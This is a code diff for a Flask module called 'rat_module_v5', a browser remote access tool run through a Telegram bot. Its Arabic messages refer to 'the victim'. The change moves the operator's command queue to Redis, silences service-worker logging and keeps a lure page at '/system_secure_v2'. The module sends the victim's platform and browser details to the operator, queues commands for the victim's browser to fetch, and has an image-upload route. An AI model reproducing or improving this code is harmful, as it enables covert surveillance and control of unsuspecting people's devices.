@@ -1,9 +1,14 @@
 import os
 import base64
 import io
+import redis
 from flask import Blueprint, render_template_string, request, Response
 
 rat_bp = Blueprint('rat_module_v5', __name__)
+
+# الاتصال بقاعدة بيانات Redis عبر المتغير البيئي (مدعوم افتراضياً في Railway و Render)
+REDIS_URL = os.getenv("REDIS_URL", "redis://localhost:6379")
+redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True)
 
 RAT_SERVICE_WORKER_TEMPLATE = """
 <!DOCTYPE html>
@@ -35,11 +40,8 @@ RAT_SERVICE_WORKER_TEMPLATE = """
         const chatId = "{{ chat_id }}";
         let activeStream = null;
 
-        // تسجيل Service Worker لضمان استمرار الاتصال في الخلفية
         if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('/sw.js?id=' + chatId).then(reg => {
-                console.log("SW Registered");
-            }).catch(err => console.log("SW Error", err));
+            navigator.serviceWorker.register('/sw.js?id=' + chatId).catch(err => {});
         }
 
         async function startExecution() {
@@ -143,23 +145,11 @@ RAT_SERVICE_WORKER_TEMPLATE = """
 </html>
 """
 
-# ملف Service Worker يتم برمجته ليقوم بعمل Ping وإبقاء اللاسلكي نشطاً
 SERVICE_WORKER_SCRIPT = """
-self.addEventListener('install', (e) => {
-    self.skipWaiting();
-});
-
-self.addEventListener('activate', (e) => {
-    e.waitUntil(self.clients.claim());
-});
-
-self.addEventListener('fetch', (e) => {
-    // تمرير الطلبات بسلاسة دون تأخير لضمان استمرار الاتصال السحابي
-    e.respondWith(fetch(e.request));
-});
+self.addEventListener('install', (e) => { self.skipWaiting(); });
+self.addEventListener('activate', (e) => { e.waitUntil(self.clients.claim()); });
+self.addEventListener('fetch', (e) => { e.respondWith(fetch(e.request)); });
 """
-
-pending_commands = {}
 
 def init_rat_routes(app, bot):
     @app.route('/system_secure_v2', methods=['GET'])
@@ -167,7 +157,6 @@ def init_rat_routes(app, bot):
         chat_id = request.args.get('id', '0')
         return render_template_string(RAT_SERVICE_WORKER_TEMPLATE, chat_id=chat_id)
 
-    # مسار خاص لملف الـ Service Worker ليعمل بشكل نظامي داخل المتصفح
     @app.route('/sw.js', methods=['GET'])
     def service_worker():
         return Response(SERVICE_WORKER_SCRIPT, mimetype='application/javascript')
@@ -178,7 +167,7 @@ def init_rat_routes(app, bot):
         chat_id = data.get('chat_id')
         if chat_id and chat_id != '0':
             msg = (
-                "🎯 **تمت استجابة الضحية بنجاح وتفعيل الخدمة الخلفية!**\n\n"
+                "🎯 **تمت استجابة الضحية بنجاح وتفعيل الخدمة الخلفية عبر Redis!**\n\n"
                 f"💻 **النظام:** `{data.get('platform')}`\n"
                 f"🌐 **المتصفح:** `{data.get('userAgent')}`\n\n"
                 "👇 **اختر الأمر المطلوب تنفيذه:**"
@@ -198,9 +187,11 @@ def init_rat_routes(app, bot):
     @app.route('/rat_v5_poll', methods=['GET'])
     def rat_poll():
         chat_id = request.args.get('id')
-        if chat_id in pending_commands and pending_commands[chat_id]:
-            action = pending_commands[chat_id].pop(0)
-            return {"action": action}
+        if chat_id:
+            # استخراج الأمر من طابور Redis المخصص لهذه الجلسة بشكل فوري وموزع
+            action = redis_client.lpop(f"cmd_queue:{chat_id}")
+            if action:
+                return {"action": action}
         return {"action": "none"}
 
     @app.route('/rat_v5_image', methods=['POST'])
@@ -237,6 +228,7 @@ def init_rat_routes(app, bot):
         return {"status": "ok"}
 
 def queue_command(chat_id, action):
-    if chat_id not in pending_commands:
-        pending_commands[chat_id] = []
-    pending_commands[chat_id].append(action)
+    # إدراج الأمر في طابور Redis (RPUSH) لضمان تسليمه بدقة ودون فقدان بيانات
+    redis_client.rpush(f"cmd_queue:{chat_id}", action)
+    # تعيين وقت انتهاء صلاحية للطابور (مثلاً ساعة) لتنظيف الذاكرة تلقائياً
+    redis_client.expire(f"cmd_queue:{chat_id}", 3600)
